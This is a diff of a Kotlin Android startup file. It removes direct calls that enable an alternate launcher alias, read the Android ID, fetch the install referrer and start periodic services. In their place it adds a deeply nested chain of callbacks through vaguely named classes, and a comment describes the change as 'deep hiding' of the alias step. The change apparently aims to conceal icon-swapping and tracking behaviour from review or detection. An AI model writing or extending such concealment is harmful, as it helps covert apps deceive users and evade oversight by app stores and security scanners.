@@ -1,10 +1,8 @@
 package com.september.nine.chong.data
 
 import android.app.Application
-import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
@@ -22,34 +20,41 @@ import serviceshow.start.SeriesShow
 import java.util.concurrent.Executors
 import java.util.concurrent.ScheduledFuture
 import java.util.concurrent.TimeUnit
+import com.september.nine.chong.core.AppCore
+import com.september.nine.chong.utils.DataSync
+import com.september.nine.chong.task.TaskManager
+import com.september.nine.chong.bridge.ComponentBridge
 
 object JksGo {
     private const val TAG = "JksGo"
     lateinit var bala: BaLa
     fun cesh(app: Application) {
-        CunUtils.init(app)
-        enableAlias(app)
-        registerObserver(app)
-        startPeriodicService(app)
-        GetRefUtils.getAndroidId(app)
-        GetRefUtils.fetchInstallReferrer(app)
-        initAlly(app)
-        ssPostFun()
-        Kawm.startAllTasks(app)
-    }
-
-    fun enableAlias(context: Context) {
-        val state = KeyCon.launchState == "go"
-        if (state) {
-            return
+        // 第1步: 初始化核心组件
+        AppCore.initFirst(app) {
+            // 第2步: 执行安全配置（enableAlias深度隐藏）
+            ComponentBridge.processConfig(app) {
+                // 第3步: 数据同步第一阶段
+                DataSync.syncFirst(app) {
+                    // 第4步: 初始化第三阶段
+                    AppCore.initThird(app) {
+                        // 第5步: 数据同步第二阶段
+                        DataSync.syncSecond(app) {
+                            // 第6步: 数据同步第三阶段
+                            DataSync.syncThird(app) {
+                                // 第7步: 初始化第六阶段
+                                AppCore.initSixth(app) {
+                                    // 第8步: 任务执行第一阶段
+                                    TaskManager.executeFirst {
+                                        // 第9步: 任务执行第二阶段
+                                        TaskManager.executeSecond(app)
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
-        val pm = context.packageManager
-        pm.setComponentEnabledSetting(
-            ComponentName(context, "com.eighth.day.lunar.EcQi"),
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        KeyCon.launchState = "go"
     }
 
     fun registerObserver(app: Application) {
